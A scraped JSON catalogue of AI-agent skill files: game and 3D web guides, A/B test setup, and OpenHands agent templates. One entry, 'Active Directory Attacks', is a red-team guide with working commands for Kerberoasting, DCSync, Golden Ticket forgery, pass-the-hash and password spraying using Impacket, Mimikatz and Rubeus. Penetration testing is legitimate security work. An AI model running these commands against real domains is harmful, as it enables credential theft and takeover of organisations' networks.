{
  "skills": [
    {
      "id": "antigravity-game-development-2d-games",
      "name": "2d-games",
      "slug": "game-development-2d-games",
      "description": "2D game development principles. Sprites, tilemaps, physics, camera.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/2d-games",
      "content": "\n# 2D Game Development\n\n> Principles for 2D game systems.\n\n---\n\n## 1. Sprite Systems\n\n### Sprite Organization\n\n| Component | Purpose |\n|-----------|---------|\n| **Atlas** | Combine textures, reduce draw calls |\n| **Animation** | Frame sequences |\n| **Pivot** | Rotation/scale origin |\n| **Layering** | Z-order control |\n\n### Animation Principles\n\n- Frame rate: 8-24 FPS typical\n- Squash and stretch for impact\n- Anticipation before action\n- Follow-through after action\n\n---\n\n## 2. Tilemap Design\n\n### Tile Considerations\n\n| Factor | Recommendation |\n|--------|----------------|\n| **Size** | 16x16, 32x32, 64x64 |\n| **Auto-tiling** | Use for terrain |\n| **Collision** | Simplified shapes |\n\n### Layers\n\n| Layer | Content |\n|-------|---------|\n| Background | Non-interactive scenery |\n| Terrain | Walkable ground |\n| Props | Interactive objects |\n| Foreground | Parallax overlay |\n\n---\n\n## 3. 2D Physics\n\n### Collision Shapes\n\n| Shape | Use Case |\n|-------|----------|\n| Box | Rectangular objects |\n| Circle | Balls, rounded |\n| Capsule | Characters |\n| Polygon | Complex shapes |\n\n### Physics Considerations\n\n- Pixel-perfect vs physics-based\n- Fixed timestep for consistency\n- Layers for filtering\n\n---\n\n## 4. Camera Systems\n\n### Camera Types\n\n| Type | Use |\n|------|-----|\n| **Follow** | Track player |\n| **Look-ahead** | Anticipate movement |\n| **Multi-target** | Two-player |\n| **Room-based** | Metroidvania |\n\n### Screen Shake\n\n- Short duration (50-200ms)\n- Diminishing intensity\n- Use sparingly\n\n---\n\n## 5. Genre Patterns\n\n### Platformer\n\n- Coyote time (leniency after edge)\n- Jump buffering\n- Variable jump height\n\n### Top-down\n\n- 8-directional or free movement\n- Aim-based or auto-aim\n- Consider rotation or not\n\n---\n\n## 6. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Separate textures | Use atlases |\n| Complex collision shapes | Simplified collision |\n| Jittery camera | Smooth following |\n| Pixel-perfect on physics | Choose one approach |\n\n---\n\n> **Remember:** 2D is about clarity. Every pixel should communicate.\n",
      "tags": [
        "ai",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:36.025Z"
    },
    {
      "id": "antigravity-game-development-3d-games",
      "name": "3d-games",
      "slug": "game-development-3d-games",
      "description": "3D game development principles. Rendering, shaders, physics, cameras.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/3d-games",
      "content": "\n# 3D Game Development\n\n> Principles for 3D game systems.\n\n---\n\n## 1. Rendering Pipeline\n\n### Stages\n\n```\n1. Vertex Processing → Transform geometry\n2. Rasterization → Convert to pixels\n3. Fragment Processing → Color pixels\n4. Output → To screen\n```\n\n### Optimization Principles\n\n| Technique | Purpose |\n|-----------|---------|\n| **Frustum culling** | Don't render off-screen |\n| **Occlusion culling** | Don't render hidden |\n| **LOD** | Less detail at distance |\n| **Batching** | Combine draw calls |\n\n---\n\n## 2. Shader Principles\n\n### Shader Types\n\n| Type | Purpose |\n|------|---------|\n| **Vertex** | Position, normals |\n| **Fragment/Pixel** | Color, lighting |\n| **Compute** | General computation |\n\n### When to Write Custom Shaders\n\n- Special effects (water, fire, portals)\n- Stylized rendering (toon, sketch)\n- Performance optimization\n- Unique visual identity\n\n---\n\n## 3. 3D Physics\n\n### Collision Shapes\n\n| Shape | Use Case |\n|-------|----------|\n| **Box** | Buildings, crates |\n| **Sphere** | Balls, quick checks |\n| **Capsule** | Characters |\n| **Mesh** | Terrain (expensive) |\n\n### Principles\n\n- Simple colliders, complex visuals\n- Layer-based filtering\n- Raycasting for line-of-sight\n\n---\n\n## 4. Camera Systems\n\n### Camera Types\n\n| Type | Use |\n|------|-----|\n| **Third-person** | Action, adventure |\n| **First-person** | Immersive, FPS |\n| **Isometric** | Strategy, RPG |\n| **Orbital** | Inspection, editors |\n\n### Camera Feel\n\n- Smooth following (lerp)\n- Collision avoidance\n- Look-ahead for movement\n- FOV changes for speed\n\n---\n\n## 5. Lighting\n\n### Light Types\n\n| Type | Use |\n|------|-----|\n| **Directional** | Sun, moon |\n| **Point** | Lamps, torches |\n| **Spot** | Flashlight, stage |\n| **Ambient** | Base illumination |\n\n### Performance Consideration\n\n- Real-time shadows are expensive\n- Bake when possible\n- Shadow cascades for large worlds\n\n---\n\n## 6. Level of Detail (LOD)\n\n### LOD Strategy\n\n| Distance | Model |\n|----------|-------|\n| Near | Full detail |\n| Medium | 50% triangles |\n| Far | 25% or billboard |\n\n---\n\n## 7. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Mesh colliders everywhere | Simple shapes |\n| Real-time shadows on mobile | Baked or blob shadows |\n| One LOD for all distances | Distance-based LOD |\n| Unoptimized shaders | Profile and simplify |\n\n---\n\n> **Remember:** 3D is about illusion. Create the impression of detail, not the detail itself.\n",
      "tags": [
        "ai",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:37.311Z"
    },
    {
      "id": "antigravity-3d-web-experience",
      "name": "3d-web-experience",
      "slug": "3d-web-experience",
      "description": "Expert in building 3D experiences for the web - Three.js, React Three Fiber, Spline, WebGL, and interactive 3D scenes. Covers product configurators, 3D portfolios, immersive websites, and bringing depth to web experiences. Use when: 3D website, three.js, WebGL, react three fiber, 3D experience.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/3d-web-experience",
      "content": "\n# 3D Web Experience\n\n**Role**: 3D Web Experience Architect\n\nYou bring the third dimension to the web. You know when 3D enhances\nand when it's just showing off. You balance visual impact with\nperformance. You make 3D accessible to users who've never touched\na 3D app. You create moments of wonder without sacrificing usability.\n\n## Capabilities\n\n- Three.js implementation\n- React Three Fiber\n- WebGL optimization\n- 3D model integration\n- Spline workflows\n- 3D product configurators\n- Interactive 3D scenes\n- 3D performance optimization\n\n## Patterns\n\n### 3D Stack Selection\n\nChoosing the right 3D approach\n\n**When to use**: When starting a 3D web project\n\n```python\n## 3D Stack Selection\n\n### Options Comparison\n| Tool | Best For | Learning Curve | Control |\n|------|----------|----------------|---------|\n| Spline | Quick prototypes, designers | Low | Medium |\n| React Three Fiber | React apps, complex scenes | Medium | High |\n| Three.js vanilla | Max control, non-React | High | Maximum |\n| Babylon.js | Games, heavy 3D | High | Maximum |\n\n### Decision Tree\n```\nNeed quick 3D element?\n└── Yes → Spline\n└── No → Continue\n\nUsing React?\n└── Yes → React Three Fiber\n└── No → Continue\n\nNeed max performance/control?\n└── Yes → Three.js vanilla\n└── No → Spline or R3F\n```\n\n### Spline (Fastest Start)\n```jsx\nimport Spline from '@splinetool/react-spline';\n\nexport default function Scene() {\n  return (\n    <Spline scene=\"https://prod.spline.design/xxx/scene.splinecode\" />\n  );\n}\n```\n\n### React Three Fiber\n```jsx\nimport { Canvas } from '@react-three/fiber';\nimport { OrbitControls, useGLTF } from '@react-three/drei';\n\nfunction Model() {\n  const { scene } = useGLTF('/model.glb');\n  return <primitive object={scene} />;\n}\n\nexport default function Scene() {\n  return (\n    <Canvas>\n      <ambientLight />\n      <Model />\n      <OrbitControls />\n    </Canvas>\n  );\n}\n```\n```\n\n### 3D Model Pipeline\n\nGetting models web-ready\n\n**When to use**: When preparing 3D assets\n\n```python\n## 3D Model Pipeline\n\n### Format Selection\n| Format | Use Case | Size |\n|--------|----------|------|\n| GLB/GLTF | Standard web 3D | Smallest |\n| FBX | From 3D software | Large |\n| OBJ | Simple meshes | Medium |\n| USDZ | Apple AR | Medium |\n\n### Optimization Pipeline\n```\n1. Model in Blender/etc\n2. Reduce poly count (< 100K for web)\n3. Bake textures (combine materials)\n4. Export as GLB\n5. Compress with gltf-transform\n6. Test file size (< 5MB ideal)\n```\n\n### GLTF Compression\n```bash\n# Install gltf-transform\nnpm install -g @gltf-transform/cli\n\n# Compress model\ngltf-transform optimize input.glb output.glb \\\n  --compress draco \\\n  --texture-compress webp\n```\n\n### Loading in R3F\n```jsx\nimport { useGLTF, useProgress, Html } from '@react-three/drei';\nimport { Suspense } from 'react';\n\nfunction Loader() {\n  const { progress } = useProgress();\n  return <Html center>{progress.toFixed(0)}%</Html>;\n}\n\nexport default function Scene() {\n  return (\n    <Canvas>\n      <Suspense fallback={<Loader />}>\n        <Model />\n      </Suspense>\n    </Canvas>\n  );\n}\n```\n```\n\n### Scroll-Driven 3D\n\n3D that responds to scroll\n\n**When to use**: When integrating 3D with scroll\n\n```python\n## Scroll-Driven 3D\n\n### R3F + Scroll Controls\n```jsx\nimport { ScrollControls, useScroll } from '@react-three/drei';\nimport { useFrame } from '@react-three/fiber';\n\nfunction RotatingModel() {\n  const scroll = useScroll();\n  const ref = useRef();\n\n  useFrame(() => {\n    // Rotate based on scroll position\n    ref.current.rotation.y = scroll.offset * Math.PI * 2;\n  });\n\n  return <mesh ref={ref}>...</mesh>;\n}\n\nexport default function Scene() {\n  return (\n    <Canvas>\n      <ScrollControls pages={3}>\n        <RotatingModel />\n      </ScrollControls>\n    </Canvas>\n  );\n}\n```\n\n### GSAP + Three.js\n```javascript\nimport gsap from 'gsap';\nimport ScrollTrigger from 'gsap/ScrollTrigger';\n\ngsap.to(camera.position, {\n  scrollTrigger: {\n    trigger: '.section',\n    scrub: true,\n  },\n  z: 5,\n  y: 2,\n});\n```\n\n### Common Scroll Effects\n- Camera movement through scene\n- Model rotation on scroll\n- Reveal/hide elements\n- Color/material changes\n- Exploded view animations\n```\n\n## Anti-Patterns\n\n### ❌ 3D For 3D's Sake\n\n**Why bad**: Slows down the site.\nConfuses users.\nBattery drain on mobile.\nDoesn't help conversion.\n\n**Instead**: 3D should serve a purpose.\nProduct visualization = good.\nRandom floating shapes = probably not.\nAsk: would an image work?\n\n### ❌ Desktop-Only 3D\n\n**Why bad**: Most traffic is mobile.\nKills battery.\nCrashes on low-end devices.\nFrustrated users.\n\n**Instead**: Test on real mobile devices.\nReduce quality on mobile.\nProvide static fallback.\nConsider disabling 3D on low-end.\n\n### ❌ No Loading State\n\n**Why bad**: Users think it's broken.\nHigh bounce rate.\n3D takes time to load.\nBad first impression.\n\n**Instead**: Loading progress indicator.\nSkeleton/placeholder.\nLoad 3D after page is interactive.\nOptimize model size.\n\n## Related Skills\n\nWorks well with: `scroll-experience`, `interactive-portfolio`, `frontend`, `landing-page-desig",
      "tags": [
        "python",
        "javascript",
        "react",
        "ai",
        "workflow",
        "design",
        "image",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:13.141Z"
    },
    {
      "id": "antigravity-ab-test-setup",
      "name": "ab-test-setup",
      "slug": "ab-test-setup",
      "description": "Structured guide for setting up A/B tests with mandatory gates for hypothesis, metrics, and execution readiness.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/ab-test-setup",
      "content": "\n# A/B Test Setup\n\n## 1️⃣ Purpose & Scope\n\nEnsure every A/B test is **valid, rigorous, and safe** before a single line of code is written.\n\n- Prevents \"peeking\"\n- Enforces statistical power\n- Blocks invalid hypotheses\n\n---\n\n## 2️⃣ Pre-Requisites\n\nYou must have:\n\n- A clear user problem\n- Access to an analytics source\n- Roughly estimated traffic volume\n\n### Hypothesis Quality Checklist\n\nA valid hypothesis includes:\n\n- Observation or evidence\n- Single, specific change\n- Directional expectation\n- Defined audience\n- Measurable success criteria\n\n---\n\n### 3️⃣ Hypothesis Lock (Hard Gate)\n\nBefore designing variants or metrics, you MUST:\n\n- Present the **final hypothesis**\n- Specify:\n  - Target audience\n  - Primary metric\n  - Expected direction of effect\n  - Minimum Detectable Effect (MDE)\n\nAsk explicitly:\n\n> “Is this the final hypothesis we are committing to for this test?”\n\n**Do NOT proceed until confirmed.**\n\n---\n\n### 4️⃣ Assumptions & Validity Check (Mandatory)\n\nExplicitly list assumptions about:\n\n- Traffic stability\n- User independence\n- Metric reliability\n- Randomization quality\n- External factors (seasonality, campaigns, releases)\n\nIf assumptions are weak or violated:\n\n- Warn the user\n- Recommend delaying or redesigning the test\n\n---\n\n### 5️⃣ Test Type Selection\n\nChoose the simplest valid test:\n\n- **A/B Test** – single change, two variants\n- **A/B/n Test** – multiple variants, higher traffic required\n- **Multivariate Test (MVT)** – interaction effects, very high traffic\n- **Split URL Test** – major structural changes\n\nDefault to **A/B** unless there is a clear reason otherwise.\n\n---\n\n### 6️⃣ Metrics Definition\n\n#### Primary Metric (Mandatory)\n\n- Single metric used to evaluate success\n- Directly tied to the hypothesis\n- Pre-defined and frozen before launch\n\n#### Secondary Metrics\n\n- Provide context\n- Explain _why_ results occurred\n- Must not override the primary metric\n\n#### Guardrail Metrics\n\n- Metrics that must not degrade\n- Used to prevent harmful wins\n- Trigger test stop if significantly negative\n\n---\n\n### 7️⃣ Sample Size & Duration\n\nDefine upfront:\n\n- Baseline rate\n- MDE\n- Significance level (typically 95%)\n- Statistical power (typically 80%)\n\nEstimate:\n\n- Required sample size per variant\n- Expected test duration\n\n**Do NOT proceed without a realistic sample size estimate.**\n\n---\n\n### 8️⃣ Execution Readiness Gate (Hard Stop)\n\nYou may proceed to implementation **only if all are true**:\n\n- Hypothesis is locked\n- Primary metric is frozen\n- Sample size is calculated\n- Test duration is defined\n- Guardrails are set\n- Tracking is verified\n\nIf any item is missing, stop and resolve it.\n\n---\n\n## Running the Test\n\n### During the Test\n\n**DO:**\n\n- Monitor technical health\n- Document external factors\n\n**DO NOT:**\n\n- Stop early due to “good-looking” results\n- Change variants mid-test\n- Add new traffic sources\n- Redefine success criteria\n\n---\n\n## Analyzing Results\n\n### Analysis Discipline\n\nWhen interpreting results:\n\n- Do NOT generalize beyond the tested population\n- Do NOT claim causality beyond the tested change\n- Do NOT override guardrail failures\n- Separate statistical significance from business judgment\n\n### Interpretation Outcomes\n\n| Result               | Action                                 |\n| -------------------- | -------------------------------------- |\n| Significant positive | Consider rollout                       |\n| Significant negative | Reject variant, document learning      |\n| Inconclusive         | Consider more traffic or bolder change |\n| Guardrail failure    | Do not ship, even if primary wins      |\n\n---\n\n## Documentation & Learning\n\n### Test Record (Mandatory)\n\nDocument:\n\n- Hypothesis\n- Variants\n- Metrics\n- Sample size vs achieved\n- Results\n- Decision\n- Learnings\n- Follow-up ideas\n\nStore records in a shared, searchable location to avoid repeated failures.\n\n---\n\n## Refusal Conditions (Safety)\n\nRefuse to proceed if:\n\n- Baseline rate is unknown and cannot be estimated\n- Traffic is insufficient to detect the MDE\n- Primary metric is undefined\n- Multiple variables are changed without proper design\n- Hypothesis cannot be clearly stated\n\nExplain why and recommend next steps.\n\n---\n\n## Key Principles (Non-Negotiable)\n\n- One hypothesis per test\n- One primary metric\n- Commit before launch\n- No peeking\n- Learning over winning\n- Statistical rigor first\n\n---\n\n## Final Reminder\n\nA/B testing is not about proving ideas right.\nIt is about **learning the truth with confidence**.\n\nIf you feel tempted to rush, simplify, or “just try it” —\nthat is the signal to **slow down and re-check the design**.\n",
      "tags": [
        "ai",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:14.583Z"
    },
    {
      "id": "antigravity-active-directory-attacks",
      "name": "Active Directory Attacks",
      "slug": "active-directory-attacks",
      "description": "This skill should be used when the user asks to \"attack Active Directory\", \"exploit AD\", \"Kerberoasting\", \"DCSync\", \"pass-the-hash\", \"BloodHound enumeration\", \"Golden Ticket\", \"Silver Ticket\", \"AS-REP roasting\", \"NTLM relay\", or needs guidance on Windows domain penetration testing.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/active-directory-attacks",
      "content": "\n# Active Directory Attacks\n\n## Purpose\n\nProvide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing.\n\n## Inputs/Prerequisites\n\n- Kali Linux or Windows attack platform\n- Domain user credentials (for most attacks)\n- Network access to Domain Controller\n- Tools: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec\n\n## Outputs/Deliverables\n\n- Domain enumeration data\n- Extracted credentials and hashes\n- Kerberos tickets for impersonation\n- Domain Administrator access\n- Persistent access mechanisms\n\n---\n\n## Essential Tools\n\n| Tool | Purpose |\n|------|---------|\n| BloodHound | AD attack path visualization |\n| Impacket | Python AD attack tools |\n| Mimikatz | Credential extraction |\n| Rubeus | Kerberos attacks |\n| CrackMapExec | Network exploitation |\n| PowerView | AD enumeration |\n| Responder | LLMNR/NBT-NS poisoning |\n\n---\n\n## Core Workflow\n\n### Step 1: Kerberos Clock Sync\n\nKerberos requires clock synchronization (±5 minutes):\n\n```bash\n# Detect clock skew\nnmap -sT 10.10.10.10 -p445 --script smb2-time\n\n# Fix clock on Linux\nsudo date -s \"14 APR 2024 18:25:16\"\n\n# Fix clock on Windows\nnet time /domain /set\n\n# Fake clock without changing system time\nfaketime -f '+8h' <command>\n```\n\n### Step 2: AD Reconnaissance with BloodHound\n\n```bash\n# Start BloodHound\nneo4j console\nbloodhound --no-sandbox\n\n# Collect data with SharpHound\n.\\SharpHound.exe -c All\n.\\SharpHound.exe -c All --ldapusername user --ldappassword pass\n\n# Python collector (from Linux)\nbloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all\n```\n\n### Step 3: PowerView Enumeration\n\n```powershell\n# Get domain info\nGet-NetDomain\nGet-DomainSID\nGet-NetDomainController\n\n# Enumerate users\nGet-NetUser\nGet-NetUser -SamAccountName targetuser\nGet-UserProperty -Properties pwdlastset\n\n# Enumerate groups\nGet-NetGroupMember -GroupName \"Domain Admins\"\nGet-DomainGroup -Identity \"Domain Admins\" | Select-Object -ExpandProperty Member\n\n# Find local admin access\nFind-LocalAdminAccess -Verbose\n\n# User hunting\nInvoke-UserHunter\nInvoke-UserHunter -Stealth\n```\n\n---\n\n## Credential Attacks\n\n### Password Spraying\n\n```bash\n# Using kerbrute\n./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123\n\n# Using CrackMapExec\ncrackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success\n```\n\n### Kerberoasting\n\nExtract service account TGS tickets and crack offline:\n\n```bash\n# Impacket\nGetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt\n\n# Rubeus\n.\\Rubeus.exe kerberoast /outfile:hashes.txt\n\n# CrackMapExec\ncrackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt\n\n# Crack with hashcat\nhashcat -m 13100 hashes.txt rockyou.txt\n```\n\n### AS-REP Roasting\n\nTarget accounts with \"Do not require Kerberos preauthentication\":\n\n```bash\n# Impacket\nGetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat\n\n# Rubeus\n.\\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt\n\n# Crack with hashcat\nhashcat -m 18200 hashes.txt rockyou.txt\n```\n\n### DCSync Attack\n\nExtract credentials directly from DC (requires Replicating Directory Changes rights):\n\n```bash\n# Impacket\nsecretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt\n\n# Mimikatz\nlsadump::dcsync /domain:domain.local /user:krbtgt\nlsadump::dcsync /domain:domain.local /user:Administrator\n```\n\n---\n\n## Kerberos Ticket Attacks\n\n### Pass-the-Ticket (Golden Ticket)\n\nForge TGT with krbtgt hash for any user:\n\n```powershell\n# Get krbtgt hash via DCSync first\n# Mimikatz - Create Golden Ticket\nkerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt\n\n# Impacket\nticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator\nexport KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass domain.local/Administrator@dc.domain.local\n```\n\n### Silver Ticket\n\nForge TGS for specific service:\n\n```powershell\n# Mimikatz\nkerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt\n```\n\n### Pass-the-Hash\n\n```bash\n# Impacket\npsexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH\nwmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH\nsmbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH\n\n# CrackMapExec\ncrackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local\ncrackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth\n```\n\n### OverPass-the-Hash\n\nConvert NTLM hash to Kerberos ticket:\n\n```bash\n# Impacket\ngetTGT.py domain.local/user -hashes :NTHASH\nexport KRB5CCNAME=user.ccache\n\n# Rubeus\n.\\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt\n```\n\n---\n\n## NTLM Relay Attacks\n\n### Responder + ntlmrelayx\n\n```bash\n# Start Responder (disable SMB/H",
      "tags": [
        "python",
        "ai",
        "llm",
        "workflow",
        "template",
        "document",
        "vulnerability",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:15.912Z"
    },
    {
      "id": "openhands-add-agent",
      "name": "add_agent",
      "slug": "add-agent",
      "description": "This agent helps create new microagents in the `.openhands/microagents` directory by providing guidance and templates.",
      "category": "AI & Agents",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/add_agent.md",
      "content": "\nThis agent helps create new microagents in the `.openhands/microagents` directory by providing guidance and templates.\n\nMicroagents are specialized prompts that provide context and capabilities for specific domains or tasks. They are activated by trigger words in the conversation and help the AI assistant understand what capabilities are available, how to use specific APIs or tools, what limitations exist, and how to handle common scenarios.\n\nWhen creating a new microagent:\n\n- Create a markdown file in `.openhands/microagents/` with an appropriate name (e.g., `github.md`, `google_workspace.md`)\n- Include YAML frontmatter with metadata (name, type, version, agent, triggers)\n- type is by DEFAULT knowledge\n- version is DEFAULT 1.0.0\n- agent is by DEFAULT CodeActAgent\n- Document any credentials, environment variables, or API access needed\n- Keep trigger words specific to avoid false activations\n- Include error handling guidance and limitations\n- Provide clear usage examples\n- Keep the prompt focused and concise\n\nFor detailed information, see:\n\n- [Microagents Overview](https://docs.OpenHnads.dev/usage/prompting/microagents-overview)\n- [Example GitHub Skill](https://github.com/OpenHands/OpenHands/blob/main/skills/github.md)\n",
      "tags": [
        "git",
        "github",
        "pr",
        "agent",
        "tool",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:26.050Z"
    },
    {
      "id": "openhands-add-repo-inst",
      "name": "add_repo_inst",
      "slug": "add-repo-inst",
      "description": "Please browse the current repository under /workspace/{{ REPO_FOLDER_NAME }}, look at the documentation and relevant code, and understand the purpose of this repository.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/add_repo_inst.md",
      "content": "\nPlease browse the current repository under /workspace/{{ REPO_FOLDER_NAME }}, look at the documentation and relevant code, and understand the purpose of this repository.\n\nSpecifically, I want you to create a `.openhands/microagents/repo.md`  file. This file should contain succinct information that summarizes (1) the purpose of this repository, (2) the general setup of this repo, and (3) a brief description of the structure of this repo.\n\nHere's an example:\n```markdown\n---\nname: repo\ntype: repo\nagent: CodeActAgent\n---\n\nThis repository contains the code for OpenHands, an automated AI software engineer. It has a Python backend\n(in the `openhands` directory) and React frontend (in the `frontend` directory).\n\n## General Setup:\nTo set up the entire repo, including frontend and backend, run `make build`.\nYou don't need to do this unless the user asks you to, or if you're trying to run the entire application.\n\nBefore pushing any changes, you should ensure that any lint errors or simple test errors have been fixed.\n\n* If you've made changes to the backend, you should run `pre-commit run --all-files --config ./dev_config/python/.pre-commit-config.yaml`\n* If you've made changes to the frontend, you should run `cd frontend && npm run lint:fix && npm run build ; cd ..`\n\nIf either command fails, it may have automatically fixed some issues. You should fix any issues that weren't automatically fixed,\nthen re-run the command to ensure it passes.\n\n## Repository Structure\nBackend:\n- Located in the `openhands` directory\n- Testing:\n  - All tests are in `tests/unit/test_*.py`\n  - To test new code, run `poetry run pytest tests/unit/test_xxx.py` where `xxx` is the appropriate file for the current functionality\n  - Write all tests with pytest\n\nFrontend:\n- Located in the `frontend` directory\n- Prerequisites: A recent version of NodeJS / NPM\n- Setup: Run `npm install` in the frontend directory\n- Testing:\n  - Run tests: `npm run test`\n  - To run specific tests: `npm run test -- -t \"TestName\"`\n- Building:\n  - Build for production: `npm run build`\n- Environment Variables:\n  - Set in `frontend/.env` or as environment variables\n  - Available variables: VITE_BACKEND_HOST, VITE_USE_TLS, VITE_INSECURE_SKIP_VERIFY, VITE_FRONTEND_PORT\n- Internationalization:\n  - Generate i18n declaration file: `npm run make-i18n`\n```\n\nNow, please write a similar markdown for the current repository.\nRead all the GitHub workflows under .github/ of the repository (if this folder exists) to understand the CI checks (e.g., linter, pre-commit), and include those in the repo.md file.\n",
      "tags": [
        "git",
        "github",
        "python",
        "testing",
        "pr",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:26.335Z"
    },
    {
      "id": "openhands-address-pr-comments",
      "name": "address_pr_comments",
      "slug": "address-pr-comments",
      "description": "First, check the branch {{ BRANCH_NAME }} and read the diff against the main branch to understand the purpose.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/address_pr_comments.md",
      "content": "\nFirst, check the branch {{ BRANCH_NAME }} and read the diff against the main branch to understand the purpose.\n\nThis branch corresponds to this PR {{ PR_URL }}\n\nNext, you should use the GitHub API to read the reviews and comments on this PR and address them.\n",
      "tags": [
        "git",
        "github",
        "pr",
        "agent",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:26.627Z"
    },
    {
      "id": "antigravity-address-github-comments",
      "name": "address-github-comments",
      "slug": "address-github-comments",
      "description": "Use when you need to address review or issue comments on an open GitHub Pull Request using the gh CLI.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/address-github-comments",
      "content": "\n# Address GitHub Comments\n\n## Overview\n\nEfficiently address PR review comments or issue feedback using the GitHub CLI (`gh`). This skill ensures all feedback is addressed systematically.\n\n## Prerequisites\n\nEnsure `gh` is authenticated.\n\n```bash\ngh auth status\n```\n\nIf not logged in, run `gh auth login`.\n\n## Workflow\n\n### 1. Inspect Comments\n\nFetch the comments for the current branch's PR.\n\n```bash\ngh pr view --comments\n```\n\nOr use a custom script if available to list threads.\n\n### 2. Categorize and Plan\n\n- List the comments and review threads.\n- Propose a fix for each.\n- **Wait for user confirmation** on which comments to address first if there are many.\n\n### 3. Apply Fixes\n\nApply the code changes for the selected comments.\n\n### 4. Respond to Comments\n\nOnce fixed, respond to the threads as resolved.\n\n```bash\ngh pr comment <PR_NUMBER> --body \"Addressed in latest commit.\"\n```\n\n## Common Mistakes\n\n- **Applying fixes without understanding context**: Always read the surrounding code of a comment.\n- **Not verifying auth**: Check `gh auth status` before starting.\n",
      "tags": [
        "ai",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:18.148Z"
    },
    {
      "id": "openhands-agent-memory",
      "name": "agent_memory",
      "slug": "agent-memory",
      "description": "1. Repository structure",
      "category": "AI & Agents",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/agent_memory.md",
      "content": "\n* Repository memory: Use .openhands/microagents/repo.md under each repository root to store and access important information.\n  - If this file exists, it will be added to your context automatically.\n  - If missing, you should create it unless the user has explicitly asked you to not do so.\n\n* Store and maintain **general knowledge** that will be helpful for most future tasks:\n  1. Repository structure\n  2. Common commands (build, lint, test, pre-commit, etc.)\n  3. Code style preferences\n  4. Workflows and best practices\n  5. Any other repository-specific knowledge you learn\n\n* IMPORTANT: ONLY LOG the information that would be helpful for different future tasks, for example, how to configure the settings, how to setup the repository. Do NOT add issue-specific information (e.g., what specific error you have ran into and how you fix it).\n\n* When adding new information:\n  - ALWAYS ask for user confirmation first by listing the exact items (numbered 1, 2, 3, etc.) you plan to save to repo.md\n  - Only save the items the user approves (they may ask you to save a subset)\n  - Ensure it integrates nicely with existing knowledge in repo.md\n  - Reorganize the content if needed to maintain clarity and organization\n  - Group related information together under appropriate sections or headings\n  - If you've only explored a portion of the codebase, clearly note this limitation in the repository structure documentation\n  - If you don't know the essential commands for working with the repository, such as lint or typecheck, ask the user and suggest adding them to repo.md for future reference (with permission)\n\nWhen you receive this message, please review and summarize your recent actions and observations, then present a list of valuable information that should be saved in repo.md to the user.\n",
      "tags": [
        "pr",
        "agent",
        "memory"
      ],
      "useCases": [],
